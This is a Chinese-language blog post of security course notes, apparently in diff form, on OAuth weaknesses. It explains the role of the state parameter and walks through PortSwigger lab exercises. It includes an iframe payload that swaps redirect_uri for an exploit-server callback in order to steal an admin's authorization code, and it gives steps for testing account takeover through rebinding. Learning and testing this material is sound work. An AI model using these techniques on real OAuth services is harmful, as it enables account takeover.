@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zhigao.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"livere","storage":true,"lazyload":false,"nav":null,"activeClass":"livere"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="第81天-身份验证篇&amp;OAuth认证&amp;授权分类及参数&amp;重定向接管&amp;State缺陷&amp;Scope篡改">
+<meta property="og:url" content="http://zhigao.xyz/2026/09/28/%E7%AC%AC81%E5%A4%A9-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%AF%87-OAuth%E8%AE%A4%E8%AF%81-%E6%8E%88%E6%9D%83%E5%88%86%E7%B1%BB%E5%8F%8A%E5%8F%82%E6%95%B0-%E9%87%8D%E5%AE%9A%E5%90%91%E6%8E%A5%E7%AE%A1-State%E7%BC%BA%E9%99%B7-Scope%E7%AF%A1%E6%94%B9/index.html">
+<meta property="og:site_name" content="Voyage Memo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zhigao.xyz/images/081-1.png">
+<meta property="og:image" content="http://zhigao.xyz/images/081-2.png">
+<meta property="og:image" content="http://zhigao.xyz/images/081-3.png">
+<meta property="article:published_time" content="2026-09-28T05:17:37.000Z">
+<meta property="article:modified_time" content="2026-09-28T05:57:20.324Z">
+<meta property="article:author" content="智高">
+<meta property="article:tag" content="笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zhigao.xyz/images/081-1.png">
+
+<link rel="canonical" href="http://zhigao.xyz/2026/09/28/%E7%AC%AC81%E5%A4%A9-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%AF%87-OAuth%E8%AE%A4%E8%AF%81-%E6%8E%88%E6%9D%83%E5%88%86%E7%B1%BB%E5%8F%8A%E5%8F%82%E6%95%B0-%E9%87%8D%E5%AE%9A%E5%90%91%E6%8E%A5%E7%AE%A1-State%E7%BC%BA%E9%99%B7-Scope%E7%AF%A1%E6%94%B9/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>第81天-身份验证篇&OAuth认证&授权分类及参数&重定向接管&State缺陷&Scope篡改 | Voyage Memo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Voyage Memo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zhigao.xyz/2026/09/28/%E7%AC%AC81%E5%A4%A9-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%AF%87-OAuth%E8%AE%A4%E8%AF%81-%E6%8E%88%E6%9D%83%E5%88%86%E7%B1%BB%E5%8F%8A%E5%8F%82%E6%95%B0-%E9%87%8D%E5%AE%9A%E5%90%91%E6%8E%A5%E7%AE%A1-State%E7%BC%BA%E9%99%B7-Scope%E7%AF%A1%E6%94%B9/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/photo.jpg">
+      <meta itemprop="name" content="智高">
+      <meta itemprop="description" content="正因为我有能力跨越，这个考验才会降临!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Voyage Memo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          第81天-身份验证篇&OAuth认证&授权分类及参数&重定向接管&State缺陷&Scope篡改
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2026-09-28 13:17:37 / 修改时间：13:57:20" itemprop="dateCreated datePublished" datetime="2026-09-28T13:17:37+08:00">2026-09-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-web%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">小迪安全课程学习笔记(web攻防)</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><font></font></p>
+<span id="more"></span>
+
+
+<p><font style="color:#ff0000;background-color:#ffff00;">演示案例：</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢</font><font style="color:#ff0000;background-color:#ffffff;"> </font><font style="color:#ff0000;background-color:#ffffff;">WEB攻防-OAuth认证-授权逻辑&amp;授权分类&amp;参数解释</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢ WEB攻防-OAuth认证-无State&amp;重定向接管&amp;篡改Scope</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;"></font></p>
+<h1 id="一、解释"><a href="#一、解释" class="headerlink" title="一、解释"></a>一、解释</h1><p>OAuth：一种常用的授权框架，它允许网站和Web应用程序请求对另一个应用程序上的用户帐户的有限访问权限，像那种允许使用第三方账号（QQ、微信等）登录的网站，可能就是使用的OAuth框架。</p>
+<h1 id="二、类型"><a href="#二、类型" class="headerlink" title="二、类型"></a>二、类型</h1><p>授权类型：授权码模式，隐式授权类型等</p>
+<p><font style="color:#2F8EF4;">这两种就简单理解授权码模式看不到token，隐式授权能看到token，前者安全一点</font></p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/TSsRNZtpttqXBviLwtYT9A">https://mp.weixin.qq.com/s/TSsRNZtpttqXBviLwtYT9A</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ATjdIxSOruY-_lCCs2kcGg">https://mp.weixin.qq.com/s/ATjdIxSOruY-_lCCs2kcGg</a></p>
+<p><font style="color:#2F8EF4;">state为什么能防止csrf，攻击者发来的攻击链接比如state等于abc，当受害者访问后，虽然url里是abc，但是code生成的同时，会生成对应的session，这里受害者code值和session值对不上，拒绝访问</font></p>
+<h1 id="三、靶场"><a href="#三、靶场" class="headerlink" title="三、靶场"></a>三、靶场</h1><p>1、OAuth隐式认证绕过</p>
+<p>2、注册资源SSRF被利用</p>
+<p>这两个过时了就不浪费时间了</p>
+<h2 id="3、存在CSRF缺陷用户被绑定-无state"><a href="#3、存在CSRF缺陷用户被绑定-无state" class="headerlink" title="3、存在CSRF缺陷用户被绑定 无state"></a><font style="color:#DF2A3F;">3、存在CSRF缺陷用户被绑定 无state</font></h2><p>这个实验的原理是，我们可以通过账号密码来登录账号，同时也能绑定第三方来登录（如：wx、qq）。我们想授权服务器发送请求的时候看到无state，然后服务器会返回一个code，我们把这个过程的url放到攻击服务器上，当攻击者访问这个攻击网站，会把我们的第三方应用权限绑到受害者账户，然后用第三方应用登录的时候就登录到受害者账号。<font style="color:#2F8EF4;">这个就是因为返回授权码的url没有state参数，所以导致随便绑定</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/081-1.png"></p>
+<h2 id="4、CSRF缺陷redirect-uri劫持code"><a href="#4、CSRF缺陷redirect-uri劫持code" class="headerlink" title="4、CSRF缺陷redirect_uri劫持code"></a><font style="color:#DF2A3F;">4、CSRF缺陷redirect_uri劫持code</font></h2><p>这个就是改redirect_url的值，改为攻击网站，攻击网站写</p>
+<p>:::info</p>
+<iframe src="[https://oauth-0a7400cb04161e5e80c1152902690027.oauth-server.net/auth?client_id=hsvii9krryl5joffjyca7&redirect_uri=https://exploit-0a2f0030045c1e37802816fc01070056.exploit-server.net/oauth-callback&response_type=code&scope=openid%20profile%20email"></iframe>](https://oauth-0a7400cb04161e5e80c1152902690027.oauth-server.net/auth?client_id=hsvii9krryl5joffjyca7&redirect_uri=https://exploit-0a2f0030045c1e37802816fc01070056.exploit-server.net/oauth-callback&response_type=code&scope=openid%20profile%20email"></iframe>)
+
+<p>:::</p>
+<p>就是让管理员一访问网站，就向授权服务器发送授权请求，然后返回的code就会被发到回调地址，回调地址填的是我们的服务器，自然就获取到code，然后带上code直接访问就是管理员账号</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/081-2.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/081-3.png"></p>
+<h2 id="5、scope篡改升级范围信息获取"><a href="#5、scope篡改升级范围信息获取" class="headerlink" title="5、scope篡改升级范围信息获取"></a>5、scope篡改升级范围信息获取</h2><p>scope本身就是控制权限的，这里就是让你改变scope值获取不同权限很好理解</p>
+<p>portswigger.net&#x2F;web-security&#x2F;all-labs#oauth-authentication参考：blog.csdn.net&#x2F;weixin_39190897&#x2F;article&#x2F;details&#x2F;139885599</p>
+<h1 id="四、复盘"><a href="#四、复盘" class="headerlink" title="四、复盘"></a>四、复盘</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/TSsQ_mWGsFYZiF_RBdfbKg">https://mp.weixin.qq.com/s/TSsQ_mWGsFYZiF_RBdfbKg</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/NuNkzax8nb72qb-S1RvTnQ">https://mp.weixin.qq.com/s/NuNkzax8nb72qb-S1RvTnQ</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/QuhNuVyb2uy2T-br-mxAJw">https://mp.weixin.qq.com/s/QuhNuVyb2uy2T-br-mxAJw</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/TSsRNZtpttqXBviLwtYT9A">https://mp.weixin.qq.com/s/TSsRNZtpttqXBviLwtYT9A</a></p>
+<p>如何测试 OAuth 换绑实现账户接管漏洞</p>
+<ol>
+<li><p>分别在两个浏览器上注册两个账号，分别为账号 A 和账号 B</p>
+</li>
+<li><p>在账号A上走完一遍绑定第三方平台的流程，抓住最后绑定的那个数据包，Send to Repeater然后Drop掉</p>
+</li>
+<li><p>在登陆了账号B的浏览器上，直接去访问账号A先前绑定的URL，观察B是否新绑定了第三方平台，如果是，则存在该漏洞，否则就不存在</p>
+</li>
+</ol>
+<p>演示案例：xxxxxx</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"># 笔记</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/09/28/%E7%AC%AC80%E5%A4%A9-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%AF%87-JWT%E4%BB%A4%E7%89%8C-%E7%A9%BA%E5%AF%86%E9%92%A5-%E6%9C%AA%E7%AD%BE%E5%90%8D-%E5%AF%86%E9%92%A5%E7%88%86%E7%A0%B4-JWK-JWU-KID-%E7%AE%97%E6%B3%95%E6%9B%BF%E6%8D%A2/" rel="prev" title="第80天-身份验证篇&JWT令牌&空密钥&未签名&密钥爆破&JWK&JWU&KID&算法替换">
+      <i class="fa fa-chevron-left"></i> 第80天-身份验证篇&JWT令牌&空密钥&未签名&密钥爆破&JWK&JWU&KID&算法替换
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="lv-container" data-id="city" data-uid="w0aFeK3v2HV9LRG7Ubh6"></div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+
+<livere-comment client-id="w0aFeK3v2HV9LRG7Ubh6"></livere-comment>
+<script type="module" src="https://www.livere.org/livere-widget.js"></script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E8%A7%A3%E9%87%8A"><span class="nav-number">1.</span> <span class="nav-text">一、解释</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E7%B1%BB%E5%9E%8B"><span class="nav-number">2.</span> <span class="nav-text">二、类型</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E9%9D%B6%E5%9C%BA"><span class="nav-number">3.</span> <span class="nav-text">三、靶场</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81%E5%AD%98%E5%9C%A8CSRF%E7%BC%BA%E9%99%B7%E7%94%A8%E6%88%B7%E8%A2%AB%E7%BB%91%E5%AE%9A-%E6%97%A0state"><span class="nav-number">3.1.</span> <span class="nav-text">3、存在CSRF缺陷用户被绑定 无state</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%E3%80%81CSRF%E7%BC%BA%E9%99%B7redirect-uri%E5%8A%AB%E6%8C%81code"><span class="nav-number">3.2.</span> <span class="nav-text">4、CSRF缺陷redirect_uri劫持code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5%E3%80%81scope%E7%AF%A1%E6%94%B9%E5%8D%87%E7%BA%A7%E8%8C%83%E5%9B%B4%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96"><span class="nav-number">3.3.</span> <span class="nav-text">5、scope篡改升级范围信息获取</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E5%A4%8D%E7%9B%98"><span class="nav-number">4.</span> <span class="nav-text">四、复盘</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="智高"
+      src="/images/photo.jpg">
+  <p class="site-author-name" itemprop="name">智高</p>
+  <div class="site-description" itemprop="description">正因为我有能力跨越，这个考验才会降临!</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">50</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Spider-px" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Spider-px" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">智高</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script color='0,0,0' opacity='0.7' zIndex='' count='90' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+});
+</script>
+
+</body>
+</html>
